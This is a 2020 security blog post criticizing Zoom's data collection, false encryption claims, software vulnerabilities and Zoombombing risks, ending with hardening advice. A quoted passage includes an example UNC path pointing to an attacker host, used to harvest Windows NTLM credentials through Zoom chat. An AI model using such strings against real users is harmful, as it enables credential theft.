Security and Privacy Implications of Zoom - Schneier on Security

## Security and Privacy Implications of Zoom

Over the past few weeks, Zoom's use has [exploded](https://www.cnbc.com/2020/02/26/zoom-has-added-more-users-so-far-this-year-than-in-2019-bernstein.html) since it became the video conferencing platform [of choice](https://i1.wp.com/www.bookwormroom.com/wp-content/uploads/2020/04/Coronavirus-Last-Supper-as-Zoom-meeting.jpg) in today's COVID-19 world. (My own university, Harvard, uses it for all of its classes. Boris Johnson had a [cabinet](https://twitter.com/BorisJohnson/status/1244985949534199808)  [meeting](https://www.theregister.co.uk/2020/04/01/zoom_spotlight/) over Zoom.) Over that same period, the company has been exposed for having both lousy privacy and lousy security. My goal here is to summarize all of the problems and talk about solutions and workarounds.

In general, Zoom's problems fall into three broad buckets: (1) bad privacy practices, (2) bad security practices, and (3) bad user configurations.

Privacy first: Zoom spies on its users for personal profit. It seems to have cleaned this up somewhat since everyone started paying attention, but it still does it.

The company collects a laundry list of data about you, including user name, physical address, email address, phone number, job information, Facebook profile information, computer or phone specs, IP address, and any other information you create or upload. And it uses all of this surveillance data for profit, against your interests.

Last month, Zoom's privacy policy contained this bit:

> Does Zoom sell Personal Data? Depends what you mean by "sell." We do not allow marketing companies, or anyone else to access Personal Data in exchange for payment. Except as described above, we do not allow any third parties to access any Personal Data we collect in the course of providing services to users. We do not allow third parties to use any Personal Data obtained from us for their own purposes, unless it is with your consent (e.g. when you download an app from the Marketplace. So in our humble opinion, we don't think most of our users would see us as selling their information, as that practice is commonly understood.

"Depends what you mean by 'sell.'" "...most of our users would see us as selling..." "...as that practice is commonly understood." That paragraph was carefully worded by lawyers to permit them to do pretty much whatever they want with your information while pretending otherwise. Do any of you who "download[ed] an app from the Marketplace" remember consenting to them giving your personal data to third parties? I don't.

Doc Searls has been [all](https://blogs.harvard.edu/doc/2020/03/27/zoom/)  [over](https://blogs.harvard.edu/doc/2020/03/28/more-zoom/)  [this](https://blogs.harvard.edu/doc/2020/03/29/helping-zoom/), writing about the surprisingly large number of third-party trackers on the Zoom website and its poor privacy practices in general.

On March 29th, Zoom [rewrote](https://zoom.us/privacy) its privacy policy:

> We do not sell your personal data. Whether you are a business or a school or an individual user, we do not sell your data.

> [...]

> We do not use data we obtain from your use of our services, including your meetings, for any advertising. We do use data we obtain from you when you visit our marketing websites, such as zoom.us and zoom.com. You have control over your own cookie settings when visiting our marketing websites.

There's lots more. It's better than it was, but Zoom still collects a huge amount of data about you. And note that it considers its home pages "marketing websites," which means it's still using third-party trackers and surveillance based advertising. (Honestly, Zoom, just [stop doing it](https://blogs.harvard.edu/doc/2020/03/30/zooms-new-privacy-policy/).)

Now security: Zoom's security is at best sloppy, and malicious at worst. Motherboard [reported](https://www.vice.com/en_us/article/k7e599/zoom-ios-app-sends-data-to-facebook-even-if-you-dont-have-a-facebook-account) that Zoom's iPhone app was sending user data to Facebook, even if the user didn't have a Facebook account. Zoom [removed the feature](https://www.vice.com/en_us/article/z3b745/zoom-removes-code-that-sends-data-to-facebook), but its response should worry you about its sloppy coding practices in general:

> "We originally implemented the 'Login with Facebook' feature using the Facebook SDK in order to provide our users with another convenient way to access our platform. However, we were recently made aware that the Facebook SDK was collecting unnecessary device data," Zoom told Motherboard in a statement on Friday.

This isn't the first time Zoom was sloppy with security. Last year, a researcher [discovered](https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5) that a vulnerability in the Mac Zoom client allowed any malicious website to enable the camera without permission. This seemed like a deliberate design choice: that Zoom designed its service to bypass browser security settings and remotely enable a user's web camera without the user's knowledge or consent. (EPIC filed an [FTC complaint](https://epic.org/2019/07/epic-files-complaint-with-ftc-.html) over this.) Zoom patched this vulnerability last year.

On 4/1, we learned that Zoom for Windows can be used to [steal](https://arstechnica.com/information-technology/2020/04/unpatched-zoom-bug-lets-attackers-steal-windows-credentials-with-no-warning/) users' Window credentials.

> Attacks work by using the Zoom chat window to send targets a string of text that represents the network location on the Windows device they're using. The Zoom app for Windows automatically converts these so-called > [> universal naming convention](https://www.lifewire.com/unc-universal-naming-convention-818230)>  strings -- such as \\attacker.example.com/C$ -- into clickable links. In the event that targets click on those links on networks that aren't fully locked down, Zoom will send the Windows usernames and the corresponding > [> NTLM](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-minimum-session-security-for-ntlm-ssp-based-including-secure-rpc-servers)>  hashes to the address contained in the link.

On 4/2, we learned that Zoom [secretly displayed](https://www.nytimes.com/2020/04/02/technology/zoom-linkedin-data.html) data from people's LinkedIn profiles, which allowed some meeting participants to snoop on each other. (Zoom has fixed this one.)

I'm sure lots more of these bad security decisions, sloppy coding mistakes, and random software vulnerabilities are coming.

But it gets worse. Zoom's encryption is awful. First, the company claims that it offers end-to-end encryption, but it [doesn't](https://theintercept.com/2020/03/31/zoom-meeting-encryption/). It only provides link encryption, which means everything is unencrypted on the company's servers. From the *Intercept*:

> In Zoom's white paper, there is a list of "pre-meeting security capabilities" that are available to the meeting host that starts with "Enable an end-to-end (E2E) encrypted meeting." Later in the white paper, it lists "Secure a meeting with E2E encryption" as an "in-meeting security capability" that's available to meeting hosts. When a host starts a meeting with the "Require Encryption for 3rd Party Endpoints" setting enabled, participants see a green padlock that says, "Zoom is using an end to end encrypted connection" when they mouse over it.

> But when reached for comment about whether video meetings are actually end-to-end encrypted, a Zoom spokesperson wrote, "Currently, it is not possible to enable E2E encryption for Zoom video meetings. Zoom video meetings use a combination of TCP and UDP. TCP connections are made using TLS and UDP connections are encrypted with AES using a key negotiated over a TLS connection."

They're also lying about the type of encryption. On 4/3, Citizen Lab [reported](https://citizenlab.ca/2020/04/move-fast-roll-your-own-crypto-a-quick-look-at-the-confidentiality-of-zoom-meetings/)

> Zoom > [> documentation](https://zoom.us/docs/doc/Zoom-Security-White-Paper.pdf)>  claims that the app uses "AES-256" encryption for meetings where possible. However, we find that in each Zoom meeting, a single AES-128 key is used in ECB mode by all participants to encrypt and decrypt audio and video. The use of ECB mode is not recommended because patterns present in the plaintext are preserved during encryption.

> The AES-128 keys, which we verified are sufficient to decrypt Zoom packets intercepted in Internet traffic, appear to be generated by Zoom servers, and in some cases, are delivered to participants in a Zoom meeting through servers in China, even when all meeting participants, and the Zoom subscriber's company, are outside of China.

I'm okay with AES-128, but using ECB (electronic codebook) mode indicates that there is no one at the company who knows anything about cryptography.

And that China connection is worrisome. Citizen Lab again:

> Zoom, a Silicon Valley-based company, appears to own three companies in China through which at least 700 employees are paid to develop Zoom's software. This arrangement is ostensibly an effort at *> labor arbitrage*> : Zoom can avoid paying US wages while selling to US customers, thus increasing their profit margin. However, this arrangement may make Zoom responsive to pressure from Chinese authorities.

Or from Chinese programmers slipping backdoors into the code at the request of the government.

Finally, bad user configuration. Zoom has a lot of options. The defaults aren't great, and if you don't configure your meetings right you're leaving yourself open to all sort of mischief.

"[Zoombombing](https://www.nytimes.com/2020/03/20/style/zoombombing-zoom-trolling.html)" is the most visible problem. People are finding open Zoom meetings, [classes](https://www.insidehighered.com/news/2020/04/03/zoombombing-isn%E2%80%99t-going-away-and-it-could-get-worse), and events: joining them, and sharing their screens to broadcast offensive content -- porn, mostly -- to everyone. It's awful if you're the victim, and a consequence of allowing any participant to share their screen.

Even without screen sharing, people are logging in to random Zoom meetings and disrupting them. Turns out that Zoom didn't make the meeting ID long enough to prevent someone from randomly trying them, looking for meetings. This isn't new; Checkpoint Research [reported this](https://research.checkpoint.com/2020/zoom-zoom-we-are-watching-you/) last summer. Instead of making the meeting IDs longer or more complicated -- which it should have done -- it enabled meeting passwords by default. Of course most of us don't use passwords, and there are now [automatic tools](https://krebsonsecurity.com/2020/04/war-dialing-tool-exposes-zooms-password-problems/) for finding Zoom meetings.

For help securing your Zoom sessions, Zoom has a [good guide](https://blog.zoom.us/wordpress/2014/09/04/complete-guide-secure-zoom-experience/). Short summary: don't share the meeting ID more than you have to, use a password in addition to a meeting ID, use the waiting room if you can, and pay attention to who has what permissions.

That's what we know about Zoom's privacy and security so far. Expect more revelations in the weeks and months to come. The New York Attorney General is [investigating](https://www.nytimes.com/2020/03/30/technology/new-york-attorney-general-zoom-privacy.html) the company. Security researchers are combing through the software, looking for other things Zoom is doing and not telling anyone about. There are more stories waiting to be discovered.

Zoom is a security and privacy [disaster](https://www.theguardian.com/technology/2020/apr/02/zoom-technology-security-coronavirus-video-conferencing), but until now had managed to avoid public accountability because it was relatively obscure. Now that it's in the spotlight, it's all coming out. (Their 4/1 response to all of this is [here](https://blog.zoom.us/wordpress/2020/04/01/a-message-to-our-users/).) On 4/2, the company [said](https://www.theguardian.com/technology/2020/apr/02/zoom-says-engineers-will-focus-on-security-and-safety-issues) it would freeze all feature development and focus on security and privacy. Let's see if that's anything more than a PR move.

In the meantime, you should either lock Zoom down as best you can, or -- better yet -- abandon the platform altogether. [Jitsi](https://jitsi.org/) is a distributed, free, and open-source alternative. Start your meeting [here](https://meet.jit.si/).

EDITED TO ADD: Fight for the Future is [on this](https://tumblr.fightforthefuture.org/post/614318663706820608/new-campaign-calls-for-zoom-to-actually).

Steve Bellovin's [comments](https://www.cs.columbia.edu/~smb/blog/2020-04/2020-04-02.html).

Meanwhile, lots of Zoom video recordings are [available](https://www.washingtonpost.com/technology/2020/04/03/thousands-zoom-video-calls-left-exposed-open-web/) on the Internet. The article doesn't have any useful details about how they got there:

> Videos viewed by The Post included one-on-one therapy sessions; a training orientation for workers doing telehealth calls, which included people's names and phone numbers; small-business meetings, which included private company financial statements; and elementary-school classes, in which children's faces, voices and personal details were exposed.

> Many of the videos include personally identifiable information and deeply intimate conversations, recorded in people's homes. Other videos include nudity, such as one in which an aesthetician teaches students how to give a Brazilian wax.

> [...]

> Many of the videos can be found on unprotected chunks of Amazon storage space, known as buckets, which are widely used across the Web. Amazon buckets are locked down by default, but many users make the storage space publicly accessible either inadvertently or to share files with other people.

EDITED TO ADD (4/4): New York City has [banned Zoom](https://chalkbeat.org/posts/ny/2020/04/04/nyc-forbids-schools-from-using-zoom-for-remote-learning-after-privacy-concerns-emerge/) from its schools.

Tags: [backdoors](https://www.schneier.com/cgi-bin/mt/mt-search.cgi?search=backdoors&__mode=tag&IncludeBlogs=2&limit=10&page=1), [data collection](https://www.schneier.com/cgi-bin/mt/mt-search.cgi?search=data%20collection&__mode=tag&IncludeBlogs=2&limit=10&page=1), [encryption](https://www.schneier.com/cgi-bin/mt/mt-search.cgi?search=encryption&__mode=tag&IncludeBlogs=2&limit=10&page=1), [privacy](https://www.schneier.com/cgi-bin/mt/mt-search.cgi?search=privacy&__mode=tag&IncludeBlogs=2&limit=10&page=1), [vulnerabilities](https://www.schneier.com/cgi-bin/mt/mt-search.cgi?search=vulnerabilities&__mode=tag&IncludeBlogs=2&limit=10&page=1)

[Posted on April 3, 2020 at 10:10 AM](https://www.schneier.com/blog/archives/2020/04/security_and_pr_1.html)• 58 Comments

- not connected to Facebook

![](../_resources/ce531943bff2de38fc2f175bf9464ad4.png)

- not connected to Twitter

![](../_resources/2187827123b1cb9bc2343f954e92abf8.png)

- not connected to Google+

![](../_resources/b9c9b792ecf94f5e55c16cac96846a63.png)

- [(L)](http://panzi.github.com/SocialSharePrivacy/)Settings